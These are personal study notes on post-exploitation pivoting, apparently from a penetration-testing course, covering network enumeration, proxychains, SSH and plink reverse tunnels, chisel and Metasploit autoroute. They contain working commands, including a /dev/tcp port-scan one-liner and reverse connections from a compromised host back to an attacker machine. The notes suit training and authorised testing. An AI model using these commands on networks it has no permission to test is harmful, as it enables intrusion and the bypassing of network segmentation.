Tunneling/Proxing: Creating a proxy type connection through a compromised machine in order to route all
	the desired traffic into the targeted network. This could potentially also be tunneled inside another protocol (eg SSH tunnelling), which can be useful for evading a basic IDS or firewall.

Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised 	machine. 

Five possible ways to enumerate a network through a compromised host:
	1. Using material found on the machine. The hosts file or ARP cache, for example.
	2. Using pre-installed tools.
	3. Using statically compiled tools
	4. Using scripting techniques
	5. Using local tools  through a proxy

	1. Looking through ARP cache: arp -a
	2. Looking through static mappings:
		1. Linux = /etc/hosts
		2. Windows = C:\Windows\System32\drivers\etc\hosts
		3. Linux = /etc/resolv.conf 
		4. Windows = ipconfig /all
		5. Linux = nmcli dev show

	Using Scripting Techniques:
		1. Bash one liner for ping sweep: 
			>for i in {1..255};  do  (ping -c 1 192.168.1.${i} | grep “bytes from” & ); done	
		2. Port scanning can be done (ideally) entirely natively:
			>for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done


ProxyChains:
	When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.
		Note: Only route traffic through proxy only when required.

	Proxychains is a command line tool which is activated by prepending the command 'proxychains' to other commands. 
		 	Example: proxychains nc 172.16.0.10 23 
		 Note: Proxychains reads its options from a config file. The master config file is located at /etc/proxychains.conf. This is where proxychains will look by default; however; its actually the last location where proxychains will look. The locations (in order are):	
		 	1. The current directory (ie ./proxychains.conf)
		 	2. ~/.proxychains/proxychains.conf
		 	3. /etc/proxychains.conf

	Note: There is another line in the proxychains config that is worth paying attention to, specifically related to the Proxy settings:
		#Proxy DNS requests - no leak for DNS data
		proxy_dns

		If performing an NMAP scan through proxychains, this option can cause the scan to hand and ultimately crash. Comment out the proxy_dns line using a hashtag (#) at the start of the line before performing a scan through a proxy.

	Other things to note when scanning through proxychains:
		-> You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (ping requests) will also not work through the proxy, so use the -Pn switch to prevent Nmap from trying it.
		-> It will extremely slow. Try to only use Nmap through a proxy when using the NSE (ie. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library.)

FoxyProxy: mozilla browser extension


SSH Tunelling/Proxying:
	Forward Connections using SSH
	1. Port Forwarding
		>ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
			-L switch creates a link to a local port. 
			-> For example, if we had SSH access to 172.16.0.5 and theres a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10
			-> We could then access the website on 172.16.0.10 by navigating to port 8000 on our own attacking machine. For example, by entering localhost:8000
			-f: background the shell.
			-N: do not execute any commands.
	2. Proxies:
		>ssh -D 1337 user@172.16.0.5 -fN
			-> Proxies are made using the -D switch, for example -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. 


	Reverse Connections using SSH
		Reverse Port Forward:
		-> Reverse Connections are very possible with the SSH client (_and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:
			>ssh-keygen - create a ssh key pair.
			-> Copy the contents of pub key, then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first. 
			-> On a new line, type tje following line, then paste in the pub key. 
				command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
				-> This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
			-> Next, check if the SSH server on your attacking machine is running: sudo systemctl status ssh
			-> Transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over. 
			-> With the key transferred, we can then connect back with a reverse port forward using the following command:
				>ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
			-> To put that into the context of our fictitious IPs 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.5 machine:
				>ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN

		Reverse Proxy:
			In newer versions of SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
				>ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
			-> This again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network. 

	Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in windows systems, even if there is not an SSH server running on the windows system we are connecting from. 		

	Note: To close any of these connections type "ps aux | grep ssh" into the terminal of the machine that created the connection:
		-> Find the process ID of the connection
		-> Finally, type "sudo kill PID" to close the connection.

Plink.exe
	-> It is a windows command line version of the PuTTY SSH client. Now that windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool.
	-> Generally speaking, WIndows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:
		>cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
			-> "cmd.exe /c echo y" at the start is for non-interactive shells.
		Example:
		>cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
			-> To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20)

		Note: The keys generated by ssh-keygen will not properly here. You will need to convert them using the puttygen tool in our attacking machine:
			>puttygen KEYFILE -o OUTPUT_KEY.ppk
			-> Substituting in a valid file for the keyfile, and adding in the output file.

			-> The resulting .ppk file can be transferred to the windows target and used in exactly the same way as with the reverse port forwarding taught previusly (despite the priv key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).


Socat

Using SSH Tunnels (You must have ssh access to the victim)
	
	1. Local: Forwards a connection from the client host to the SSH server host and then to the destination host port.

		>ssh -L <local_ip>:<local_port>:<dest_service>:<dest_port> username@<ip>
		
		-> If local_ip is omitted, the ssh client binds on the localhost.
		-> When the destination host is the same as the SSH server, instead of specifying the destination host IP or hostname, you can use localhost.


		For example, You want to access a webserver running on the victim's port 10000 and you cant access from outside, then you can set up a local port forward like this:
			>ssh -L 8080:localhost:10000 -N -f username@SSH_server_IP
				-N: dont execute the command
				-f: to run in the background.

	2. Remote: Forwards a port from the server host to the client host and then to the destination host port.
		>ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER


Chisel Reverse Port Forwarding
	1. Upload chisel windows binary to the target.
	2. Run chisel server locally:
		./chisel_1.7.3_linux_amd64 server -p 5678 -reverse
		-> This means we have opened up a port 5678 to which chisel client will connect to
	3. Run chisel client on the target:
		chisel.exe client 10.10.16.20:5678 R:8888:127.0.0.1:8888
		-> This means we are connecting to the chisel server running on the attacker machine, and forwarding port 8888 locally so that we can access port 8888 on the attacking machine.
		

Auto-Routing our Traffic:
	To setup a proxy server you will need a meterpreter session or a reverse shell open in metasploit before hand. You can easily get a meterpreter shell by uploading a payload to the machine and executing it.
	1. background
	2. use post/multi/manage/autoroute
	3. set SESSION 1
	4. set SUBNET 10.200.x.0
	5. exploit

Setting up our Proxy with Metasploit:
	1. use auxiliary/server/socks4a
	2. (optional) Change your port, you can either keep the default 1080 port or change it to an open port of your choice.
	
	Note: Depending on what version of Metasploit you are using, the Proxy Server module will be different. MSF5 and lower will have auxiliary/server/socks4a or socks5, MSF6 and newer will have socks/auxiliary/socks_proxy. With MSF6, you will need to specify if you want to use SOCKS4(a) or SOCKS5.
	

Configuring and Using the proxy chains:
	1. sudo nano /etc/proxychains.conf
	2. You will need to comment out the socks4 proxy on 9050 which is a default proxy for tor and add the proxy chain we just created with the port that you gave when creating the proxies.
	3. proxychains <command>
		-> You can now run any normal commands or tools that you want and it will be forwarded through the proxy chain if you append your tool or command with “proxychains”.
		
Pivoting with proxychains:
	Pivoting may seem like a very big and scary thing but it is actually fairly simple after you have your proxy server set up. After setting up the proxy server you can pivot to any machines or resources that the proxy server has access to. For example if you had a proxy server on example-ws01 and example-ws02 was segmented by a security groups that made it so only example-ws01 had access you could use your proxy server on example-ws01 to access example-ws02. You can use any way of accessing the machine that you would usually like ssh, rdp, win-rm, psexec you just have to prepend the command with proxychains.
	
	Examples:
		1.) proxychains ssh user@MACHINE_IP
		2.) proxychains xfreerdp /u:user /p:password /v:MACHINE_IP
		3.) proxychains evil-winrm -i MACHINE_IP -u user -p password

Setting up a Web Proxy with FoxyProxy
	Now that we have a proxy setup to forward our traffic through we need a way to easily access the resources on the network. Let's add an extension to our web browser to allow us to easily route our traffic through it.
	1.) Click on FoxyProxy among your extensions. After that, click on 'Options', Then click on 'Add'.
	2.) Enter in the following setting you will need to fill in the title, proxy type (SOCKS4), Proxy IP, and Port then click 'Save'.
	3.) Click on Foxy Proxy in your extensions and enable the web proxy.
	Note: You can now access internal resources and devices from within firefox.


